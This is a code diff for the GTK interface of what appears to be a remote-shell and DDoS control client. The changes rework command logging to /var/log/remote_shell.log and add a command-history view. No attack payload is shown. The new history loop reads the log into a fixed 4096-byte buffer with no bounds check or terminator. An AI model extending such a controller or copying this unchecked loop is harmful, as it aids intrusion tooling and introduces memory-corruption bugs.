@@ -27,14 +27,11 @@ const gchar *server_ip;
 const gchar *server_port;
 int port;
 
-GtkWidget *text_view;
-
 SOCKET remote_shell_sock;
 
+GtkWidget *text_view;
 GtkWidget *rs_text_view;
-
 GtkWidget *ddos_text_view;
-
 GtkWidget *historic_text_view;
 
 
@@ -87,8 +84,10 @@ void cb_send_cmd(GtkWidget *widget, gpointer user_data)
     const char *buffer_cmd = NULL;
     char *final_buffer = NULL;
     char *start_command = "> Command : ";
+    char historic[4096] = "";
     
     size_t data_len = 0;
+
     
     final_buffer = malloc(4096  * sizeof(char));
     if(final_buffer == NULL)
@@ -100,7 +99,7 @@ void cb_send_cmd(GtkWidget *widget, gpointer user_data)
 
     buffer_cmd = gtk_entry_get_text(GTK_ENTRY(user_data));
     
-    buffer = malloc(MAXDATASIZE* sizeof(char));
+    buffer = malloc(MAXDATASIZE * sizeof(char));
     if(buffer == NULL)
     {
         error("malloc() buffer", "send_cmd()");
@@ -152,6 +151,16 @@ void cb_send_cmd(GtkWidget *widget, gpointer user_data)
 
         free(buffer);
         free (final_buffer);
+        
+            
+        log_cmd_results = fopen("/var/log/remote_shell.log", "w");
+        if(log_cmd_results == NULL)
+        {
+            error("fopen()", "send_cmd()");
+            return;
+        }
+
+        fputs("", log_cmd_results);
 
         fclose(log_cmd_results);
 
@@ -174,7 +183,7 @@ void cb_send_cmd(GtkWidget *widget, gpointer user_data)
     final_buffer = strncat(final_buffer, "\n", 3);
     final_buffer = strncat(final_buffer, buffer, strlen(buffer) + 1);
     
-    printf("Buffer_final = %s\n", final_buffer);
+    //printf("Buffer_final = %s\n", final_buffer);
     
     utf8_text = g_locale_to_utf8(final_buffer, strlen(final_buffer), NULL, NULL, NULL);
 
@@ -192,8 +201,6 @@ void cb_send_cmd(GtkWidget *widget, gpointer user_data)
     text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
 
     /** Print the text **/
-    
-    printf("\n\ntext  = %s\n", text);
     
     g_print("%s", text);
 
@@ -229,53 +236,50 @@ void cb_send_cmd(GtkWidget *widget, gpointer user_data)
     
     fclose(log_cmd_results);
     
-    char historic[65535] = "";
-    
     log_cmd_results = fopen("/var/log/remote_shell.log", "r");
     if(log_cmd_results == NULL)
     {
         error("fopen()", "send_cmd()");
         return;
     }
- 
-    /*
-    if(fputs("Command: ", log_cmd_results) == EOF)
+    
+    int caractereLu = 0;
+    int i = 0;
+    
+    
+    while((caractereLu = fgetc(log_cmd_results)) != EOF)
     {
-        error("fputs() Command\n", "send_cmd()");
-        return;
+        historic[i] = (char)caractereLu;
+        i++;
     }
+    
+    utf8_text = g_locale_to_utf8(historic, strlen(historic), NULL, NULL, NULL);
 
-    if(fputs(buffer_cmd, log_cmd_results) == EOF)
-    {
-        error("fputs() buffer_cmd", "send_cmd()");
-        return;
-    }
+    /** Obtaining the buffer associated with the widget **/
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(historic_text_view));
 
-    if(fputs("\n", log_cmd_results) == EOF)
-    {
-        error("fputs() \n", "send_cmd()");
-        return;
-    }
+    /** Set the default buffer text. */
+    gtk_text_buffer_set_text(text_buffer, utf8_text, -1);
 
-    if(fputs(buffer, log_cmd_results) == EOF)
-    {
-        error("fputs() buffer", "send_cmd()");
-        return;
-    }
+    /** Obtain iters for the start and end of points of the buffer **/
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
 
-    if(fputs("\n\n", log_cmd_results) == EOF)
-    {
-        error("fputs() :\\n x 2", "send_cmd");
-        return;
-    }
-     * 
-     * */
+    /** Get the entire buffer text **/
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+
+    /** Print the text **/
+    g_print("%s\n", text);
+
+    g_free(text);
+    
+    
 
     free(buffer);
     free(final_buffer);
 
     fclose(log_cmd_results);
-
+    
     /* Parametres inutilises */
     (void)widget;
 
